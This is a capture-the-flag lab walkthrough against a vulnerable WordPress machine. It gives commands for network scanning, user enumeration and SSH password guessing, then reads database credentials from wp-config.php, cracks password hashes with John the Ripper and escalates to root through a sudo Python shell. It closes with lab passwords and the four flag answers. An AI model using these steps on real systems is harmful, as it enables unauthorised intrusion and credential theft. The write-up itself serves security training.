# **TARGET 1 Offensive WalkThrough**

## Overview

You are working as a Security Engineer for X-CORP, supporting the SOC infrastructure. The SOC analysts have noticed some discrepancies with alerting in the Kibana system and the manager has asked the Security Engineering team to investigate.

To start, your team needs to confirm that newly created alerts are working. Once the alerts are verified to be working, you will monitor live traffic on the wire to detect any abnormalities that aren't reflected in the alerting system.

You must report your findings to the SOC manager and the engineering manager with appropriate analysis.

>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other techniques have been explored. Look at the end of this walkthrough (Grep) or the presentation (LFI) to find different approaches.

---

Tools:

- Kali Linux
- Q shell
- Nmap
- Wpscan
- Google Chrome Browser
- Google Developers Tool
- SSH
- Bash Commands
- Mysql
- John the Ripper
- Python Script

---

## **Walkthrough**

1. Run a command to see host IP and network addresses.

        ifconfig

    ![1](/Resources/Images/1/1.png)

2. Network FootPrinting (find machines on the network).

        nmap 192.168.1.0/24

    ![2](/Resources/Images/1/2.png)

3. Target1 fingerprinting (find services and ports on target1). 

        nmap -sV 192.168.1.110

    ![3](/Resources/Images/1/3.png)

4. Enumerate with wpscan.

        wpscan --url http://192.168.1.110/wordpress -eu

    **Likewise, the usernames are easy to guess because of the leads on the website.**

    ![4](/Resources/Images/1/4.png)

5. Find the flag inside the code with the google developers tool.

    - Go to Services.

    - Search: `flag`

    **flag1**

    ![5](/Resources/Images/1/5.png)

6. Access Target1 through SSH from the Kali Linux Terminal.

        ssh michael@192.168.1.110

7. The method to obtain the password is guessing. It also can be obtained by brute force using Hydra.

    Password: `michael`

    ![6](/Resources/Images/1/6.png)

8. Look for flags.

        pwd

        cd ../../

        find  -iname “*flag*” 2>/dev/null

    ![7](/Resources/Images/1/7.png)

9. Open the file.

        cat /var/www/flag2.txt

    **flag2**

    ![8](/Resources/Images/1/8.png)

10. Explore the WordPress directory.

        cd /var/www/html/wordpress

11. Open the wp-config.php file.

        Nano wp-config.php

    ![9](/Resources/Images/1/9.png)

12. Login into MySQL with the root user.
          
        mysql -u root -p

    **Password: `R@v3nSecurity`**

13. Glance databases.

        show databases;

    ![10](/Resources/Images/1/10.png)

14. Use the WordPress database.

        use wordpress;

    ![11](/Resources/Images/1/11.png)

15. Glance tables of the WordPress database.

        show tables;

    ![12](/Resources/Images/1/12.png)

16. SQL query to glance at the wp_user table.

        SELECT * FROM wp_users;

    ![13](/Resources/Images/1/13.png)

17. Prepare the Hashes to crack them.

 - Select and right-click and copy the hashes.

    - Open a new terminal in the Kali Linux machine and create a file called hashes.txt with the nano command.
    
    - Paste the hashes on the file.

    - Give the appropriate structure for john the ripper to use.

            nano hashes.txt

        ##### Note: **To exit nano: "CTRL X", then "y" and "enter".**

        ![14](/Resources/Images/1/14.png)

18. Crack the hashes with John the Ripper.

        john hashes.txt -wordlist="/usr/share/wordlists/rockyou.txt"

    #### Note: **If an error occurs because "rockyou.txt" is compressed, use: `sudo gunzip  /usr/share/wordlists/rockyou.txt.gz` to decompress**

19. Check the cracked hashes.

        john –show hashes.txt

    ![15](/Resources/Images/1/15.png)

20. Privilege escalation. Change user to steven.

        sudo steven

    **Password: `pink84`**

21. Glance at privileges of steven.

        Sudo -l

    ![16](/Resources/Images/1/16.png)

22. Use python script to use steven's python root privilege to gain root access.

        sudo python -c 'import pty;pty.spawn("/bin/bash")'  

    ![17](/Resources/Images/1/17.png)

23. Search flags.

        find  -iname “*flag*” 2>/dev/null

    ![18](/Resources/Images/1/18.png)

24. Open the file.

        cat /root/flag4.txt

    **flag4**

    ![19](/Resources/Images/1/19.png)

25. Search flag3.

        cd /var

        grep -r flag3 *

    ![20](/Resources/Images/1/20.png)

26. Open the binary file with nano.

        nano /var/lib/mysql/ib_logfile0

27. Use the nano command to search.

        Ctrl w

28. Enter the pattern to look for and hit enter.

        flag3

    **flag3**

    ![21](/Resources/Images/1/21.png)

***

# An alternative method to obtain flag3 and flag4.

## SQL database: **Flag 3 and 4**

- SQL Queries

```
mysql -u root -p
mysql> show databases;
mysql> use wordpress;
mysql> show tables;
mysql> select * from wp_posts;
```
- **Flag3 and Flag4**
 
    ![11](/Resources/Images/1/22.png)



***

# FLAGS

flag1{b9bbcb33e11b80be759c4e844862482d}

flag2{fc3fd58dcdad9ab23faca6e9a36e581c}

flag3{afc01ab56b50591e7dccf93122770cd2}

flag4{715dea6c055b9fe3337544932f2941ce}
